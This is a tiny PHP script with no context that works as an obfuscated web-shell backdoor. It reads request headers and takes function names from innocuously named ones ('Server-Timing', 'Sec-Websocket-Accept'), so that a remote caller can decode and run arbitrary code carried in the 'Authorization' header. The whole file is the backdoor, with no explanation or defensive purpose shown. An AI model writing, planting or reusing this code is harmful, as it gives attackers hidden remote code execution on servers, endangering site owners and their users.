<?php

$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $include = $_HEADERS['Server-Timing']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Authorization']));
    $include();
}